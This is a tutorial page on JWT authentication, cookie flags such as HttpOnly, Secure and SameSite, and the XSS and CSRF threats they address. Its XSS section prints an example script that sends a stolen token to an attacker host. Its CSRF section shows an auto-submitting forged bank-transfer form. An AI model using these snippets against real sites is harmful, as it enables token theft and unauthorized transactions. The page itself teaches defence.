---
title: "Json Web Token (JWT) "
slug: "jwt"
description: "Understanding authentication, authorization, token-based security, and session management."
featured: false
---


# Introduction

- A JWT is a standardized, compact way to securely transmit information between different systems.
- JWTs are commonly used for authentication and authorization in web applications.
- **Structure:** It consists of three parts separated by dots:
    - **Header:** Contains metadata about the token (e.g., algorithm used for signing).
    - **Payload:** The actual data/claims you want to transmit (e.g., user ID, roles, expiration time).
    - **Signature:** A cryptographic hash used to verify the integrity and authenticity of the token.
- **Code for generating JWT**

    ```javascript
    const jwt = require('jsonwebtoken');
    
    const payload = {
      user_id: 123,
      username: 'example_user',
      role: 'admin'
    };
    
    const secretKey = 'your_secret_key'; // Should be securely stored
    
    const token = jwt.sign(payload, secretKey);
    
    console.log(token);
    ```

- **Code for verifying the JWT**

    ```javascript
    const jwt = require('jsonwebtoken');
    
    const token = 'your_jwt_token'; // Token received from the client
    
    const secretKey = 'your_secret_key'; // Should match the one used for signing
    
    jwt.verify(token, secretKey, (err, decoded) => {
      if (err) {
        console.error('JWT verification failed:', err);
      } else {
        console.log('Decoded token:', decoded);
      }
    });
    ```

- One of the good analogy to understand the working as banking document verification through sign. The server create a sign with Header, Payload and SecretKey. When the client send the token, the server extract the Header and Payload and with the help of SecretKey, it create the signature and compare it with the signature to verify.
- Imaging an attacker steals her JWT **before** he logs out. Even when user is logged out, the attacker can access the server, because they have valid JWT.
- The issue is that, the backend is purely stateless. This is one of the **limitations of stateless JWT authentication**.
- Production systems usually solve this by using short-lived access tokens with refresh tokens, or by maintaining a token revocation list for refresh tokens.

# Authentication Using Cookies


Cookie-based authentication stores authentication information inside an **HTTP cookie** instead of the browser's local storage. The browser automatically sends the cookie with every request to the server, allowing the server to identify the authenticated user.


## Why Cookies Were Introduced Over Local Storage?


### Problem 1: XSS (Cross-Site Scripting)


If an attacker injects malicious JavaScript into your website:


```javascript
const token = localStorage.getItem("token");
```


The attacker can steal the JWT and impersonate the user from anywhere.


**With cookies:**


Authentication cookies can be marked as:


```plain text
HttpOnly
```


An HttpOnly cookie:

- Cannot be accessed using JavaScript.
- Cannot be read using `document.cookie`.
- Can only be sent automatically by the browser.

Even if JavaScript is compromised, the attacker cannot directly steal the token.


### Problem 2: Manual Token Management


**With Local Storage:**


```javascript
const token = localStorage.getItem("token");

fetch("/api/user", {
    headers: {
        Authorization: `Bearer ${token}`
    }
});
```


You must manually read token, attach authorization header, handle expiration, refresh token.


**With cookies:**


Browser automatically sends:


```plain text
Cookie: accessToken=...
```


No manual work is required.


### Problem 3: Better Browser Integration


Cookies support built-in browser features such as:

- Expiration
- Secure transmission
- SameSite protection
- Automatic inclusion with requests

Local Storage provides none of these security features.


# Important Cookie Flags

- **`HttpOnly`**
    - JavaScript cannot access the cookie.
    - Prevents token theft through XSS.
- **`Secure`**
    - Cookie is sent only over HTTPS.
    - Prevents token leakage over insecure HTTP connections.
- **`SameSite`**
    - Controls when cookies are sent with cross-site requests.
    - `SameSite=Strict`
        - Cookie is sent only when navigating within the same website.
        - Highest CSRF protection.
    - `SameSite=Lax`
        - Default in modern browsers.
        - Cookie is sent for normal navigation but blocked for most cross-site requests.
    - `SameSite=None; Secure`
        - Cookie is sent for all requests, including cross-origin requests.
        - Required for: Different frontend domain and Different backend domain
        - Must always be used with `Secure`.
- **Cookie Example**

    ```plain text
    Set-Cookie:
    accessToken=eyJhbGciOi...;
    HttpOnly;
    Secure;
    SameSite=Lax;
    Max-Age=900
    ```


# Are Cookies Completely Safe?


No.


Although HttpOnly cookies protect against **XSS token theft**, they are still vulnerable to **Cross-Site Request Forgery (CSRF)** because the browser automatically sends cookies with requests.


To mitigate CSRF:

- Use `SameSite=Lax` or `SameSite=Strict`.
- Use CSRF tokens for sensitive operations.
- Validate the `Origin` or `Referer` headers where appropriate.

# Security Considerations for authentication

1. Signature Stripping
    - A common method for attacking a signed JWT is to simply remove the signature.
    - it is possible to remove the signature and then change the header to claim the JWT is unsigned.
    - This can be easily solved by making sure that the application that performs the validation does not consider unsigned JWTs valid.
2. XSS (Cross site scripting )
3. Cross-Site Request Forgery (CSRF)

# Understanding the XSS issue

- **XSS (Cross-Site Scripting)** is an attack where an attacker manages to execute their own JavaScript on your website.
- For example, suppose your website has a vulnerability that allows an attacker to inject:

    ```javascript
    const token = localStorage.getItem("token");
    fetch("https://attacker.com/steal", {
      method: "POST",
      body: token
    });
    
    // When a user visits that page, this code runs inside the user's browser.
    ```

- Now, the attacker has your JWT. From their own computer, they can send:

    ```javascript
    GET /api/profile
    Authorization: Bearer <stolen JWT>
    ```

- That’s why, `HttpOnly` Cookies comes into the picture.
- It's a security rule enforced by the browser that javascript can’t access cookies marked with `HttpOnly` cookies.
- The attacker cannot steal the cookie, but they can abuse the user's active session by running their script. Now, attacker is making unsafe request instead of stealing JWT using XSS.

    ```javascript
    fetch("/transfer", {
        method: "POST",
        body: JSON.stringify({
            amount: 1000
        })
    });
    ```


# Understanding CSRF issue

- **CSRF (Cross-Site Request Forgery)** is an attack where an attacker tricks a logged-in user's browser into sending an unwanted request to another website.
- Suppose you are still logged into your bank and you visit: `https://evil.com`
- You think it's just a normal website, but it contains:

    ```javascript
    <form action="https://bank.com/transfer" method="POST">
        <input name="amount" value="10000">
        <input name="to" value="attacker">
    </form>
    
    <script>
    document.forms[0].submit();
    </script>
    ```

